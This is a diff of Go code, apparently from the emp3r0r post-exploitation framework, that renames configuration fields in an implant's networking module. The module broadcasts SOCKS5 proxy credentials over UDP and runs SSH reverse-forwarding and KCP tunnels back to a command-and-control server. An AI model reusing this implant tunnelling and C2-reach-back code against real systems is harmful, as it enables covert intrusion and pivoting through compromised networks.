@@ -25,7 +25,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 	defer cancel()
 	bindaddr := ":" + port
 	if port == "" {
-		bindaddr = ":" + RuntimeConfig.BroadcastPort
+		bindaddr = ":" + RuntimeConfig.ProxyChainBroadcastPort
 	}
 	pc, err := net.ListenPacket("udp4", bindaddr)
 	if err != nil {
@@ -39,7 +39,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 	// reverseProxy listener
 	// ssh reverse proxy
 	go func() {
-		err = tun.SSHRemoteFwdServer(RuntimeConfig.ReverseProxyPort,
+		err = tun.SSHRemoteFwdServer(RuntimeConfig.Bring2CCReverseProxyPort,
 			RuntimeConfig.Password,
 			RuntimeConfig.SSHHostKey)
 		if err != nil {
@@ -51,7 +51,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 	go func() {
 		ctx, cancel := context.WithCancel(context.Background())
 		err = tun.KCPTunServer(
-			fmt.Sprintf("127.0.0.1:%s", RuntimeConfig.ReverseProxyPort), // forward to ssh reverse proxy
+			fmt.Sprintf("127.0.0.1:%s", RuntimeConfig.Bring2CCReverseProxyPort), // forward to ssh reverse proxy
 			RuntimeConfig.KCPServerPort,
 			RuntimeConfig.Password,
 			emp3r0r_def.MagicString,
@@ -213,7 +213,7 @@ func BroadcastMsg(msg, dst string) (err error) {
 
 func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.CancelFunc) {
 	// disable broadcasting when interval is 0
-	if RuntimeConfig.BroadcastIntervalMax == 0 {
+	if RuntimeConfig.ProxyChainBroadcastIntervalMax == 0 {
 		log.Println("Broadcasting is turned off, aborting")
 		return
 	}
@@ -239,7 +239,7 @@ func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.Cance
 	}()
 	for ctx.Err() == nil {
 		log.Print("Broadcasting our proxy...")
-		time.Sleep(time.Duration(util.RandInt(RuntimeConfig.BroadcastIntervalMin, RuntimeConfig.BroadcastIntervalMax)) * time.Second)
+		time.Sleep(time.Duration(util.RandInt(RuntimeConfig.ProxyChainBroadcastIntervalMin, RuntimeConfig.ProxyChainBroadcastIntervalMax)) * time.Second)
 		ips := tun.IPaddr()
 		for _, netip := range ips {
 			proxyMsg := fmt.Sprintf("socks5://%s:%s@%s:%s",
@@ -250,7 +250,7 @@ func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.Cance
 			if broadcastAddr == "" {
 				continue
 			}
-			err := BroadcastMsg(proxyMsg, broadcastAddr+":"+RuntimeConfig.BroadcastPort)
+			err := BroadcastMsg(proxyMsg, broadcastAddr+":"+RuntimeConfig.ProxyChainBroadcastPort)
 			if err != nil {
 				log.Printf("BroadcastMsg failed: %v", err)
 			}
